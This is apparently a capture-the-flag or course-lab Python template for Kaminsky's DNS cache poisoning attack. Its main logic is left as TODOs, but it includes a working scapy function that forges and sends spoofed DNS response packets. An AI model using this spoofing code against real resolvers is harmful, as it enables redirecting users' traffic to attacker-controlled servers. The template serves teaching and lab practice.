#!/usr/bin/env python3
from pwn import connect
from scapy.all import IP, UDP, Raw, send
from typing import Optional
from utils import build_response_packet, RecordType, ResponseCode

# TODO: Configure these constants
TARGET_APEX_DOMAIN = ""
ATTACKER_NAMESERVER_IP = ""
TTL = -1

YOUR_REAL_IP = '' # TODO: fill in your actual ip here
SPOOFED_IP = ''
SPOOFED_PORT = -1
SERVER_IP = ''

BATCH_SIZE = 1024 # TODO: tune this
MAX_TRANSACTION_ID = 65535
MAX_WORKERS = 1024 # TODO: tune this (use "$ulimit" when necessary)

def extract_port(output: str) -> int:
    # TODO: Extract the source port from the server's output
    pass

def send_dns_response(
    src_ip: str,    dst_ip: str,
    src_port: int,  dst_port: int,
    transaction_id: int,
    domain: str,
    qtype: RecordType,
    answer: str,
    ttl: int,
    auth_ip: Optional[str] = None
):
    response_packet = build_response_packet(
        tid=transaction_id,
        domain=domain,
        qtype=qtype,
        rcode=ResponseCode.NOERROR,
        answer=answer,
        ttl=ttl,
        auth_ip=auth_ip
    )

    ip_layer = IP(src=src_ip, dst=dst_ip)
    udp_layer = UDP(sport=src_port, dport=dst_port)
    raw_layer = Raw(load=response_packet)

    packet = ip_layer / udp_layer / raw_layer
    send(packet, verbose=0)

def main():
    server = connect(SERVER_IP, 48766)

    # TODO: Perform Kaminsky's DNS cache poisoning attack
    # Friendly Reminder: You should use YOUR_REAL_IP instead of SPOOFED_IP as the source ip in your spoofed responses, lest your ISP drops packets with incorrect source ips

    # TODO: Receive FLAG2 from the server

    server.close()

if __name__ == "__main__":
    main()
